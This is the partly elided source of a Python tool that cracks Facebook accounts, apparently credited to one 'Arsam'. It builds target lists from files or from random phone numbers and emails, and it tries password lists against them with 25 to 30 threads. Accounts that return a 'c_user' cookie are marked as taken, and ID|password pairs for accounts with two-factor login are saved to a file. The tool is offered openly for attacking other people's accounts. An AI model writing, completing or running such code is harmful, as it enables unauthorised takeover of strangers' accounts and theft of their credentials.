...
from concurrent.futures import ThreadPoolExecutor as Mr_arsam_arif_sad_boy
import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess
from rich import print as mr_arsam_arif_sad_boy
...
\033[1;97m                             yo
\033[1;97m ------------------------------
\033[1;97m [+] Author : Arsam
\033[1;97m [+] Fb id  : Arsam arif
\033[1;97m [+] group  : Arsam commend(AXA)
\033[1;97m [+] version: 01
\033[1;97m ------------------------------"""
...
def main():
    print(BXB)
    mr_Arsam_arif_sad_boy(minx)
    mr_Arsam_arif_sad_boy(' [1] clone from file')
    mr_Arsam_arif_sad_boy(' [2] clone random gmail+number')
    mr_Arsam_arif_sad_boy(' [3] file creating and cute etc Menu')
    mr_Arsam_arif_sad_boy(' [0] exit-program')
    mr_Arsam_arif_sad_boy(minx)
    opt = input(' [+] put:  ')
    if opt =='1':
    	os.system('clear')
        ...
        mr_Arsam_arif_sad_boy('\n Choose valid option ... ');os.system ("clear")
        main()
def random_crack():
    global ok,cp,tf
    mr_Arsam_arif_sad_boy(minx)
    mr_Arsam_arif_sad_boy(' [1] Random Number')
    mr_Arsam_arif_sad_boy(' [2] Random Email ')
    mr_Arsam_arif_sad_boy(' [0] main-menu')
    mr_Arsam_arif_sad_boy(minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        ...
        print(BXB)
        mr_Arsam_arif_sad_boy(minx)
        mr_Arsam_arif_sad_boy(' [+] any country code without + ')
        mr_Arsam_arif_sad_boy(minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(AXA)
        ...
        with mr_Arsam_arif_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_Arsam_arif_sad_boy(minx)
            mr_Arsam_arif_sad_boy(' [+] Total ids: '+total_ids)            
            mr_Arsam_arif_sad_boy(' [+] Use flight mode for speed')
            mr_Arsam_arif_sad_boy(minx)
            for user in fo:
                ids,ps = user.split('|')
        ...
        mr_Arsam_arif_sad_boy(minx)
        mr_Arsam_arif_sad_boy(' The process has completed')
        mr_Arsam_arif_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        ...
        mr_Arsam_arif_sad_boy('please put correct adress... ')
        time.sleep(1)
        random_crack()
...
def file_crack():
    ...
    print(AXA)
    mr_Arsam_arif_sad_boy(minx)
    mr_Arsam_arif_sad_boy(' [1] Method ')
    mr_Arsam_arif_sad_boy(' [2] Method ')
    mr_Arsam_arif_sad_boy(' [3] Method ')
    mr_Arsam_arif_sad_boy(' [4] Method ')
    mr_Arsam_arif_sad_boy(minx)
    ...
    try:
        ...
        mr_Arsam_arif_sad_boy(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
    ...
    with mr_Arsam_arif_sad_boy(max_workers=25) as crack_submit:
        os.system('clear')
        print(AXA)
        total_ids = str(len(fo))
        mr_Arsam_arif_sad_boy(minx)
        ...
        for user in fo:
            ...
            if opt_method =='1':
                ...
                mr_Arsam_arif_sad_boy(' something wrong in methods ');exit()
    mr_Arsam_arif_sad_boy(minx)
    mr_Arsam_arif_sad_boy(' The process has completed')
    mr_Arsam_arif_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[AXA-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[AXA-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[AXA-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
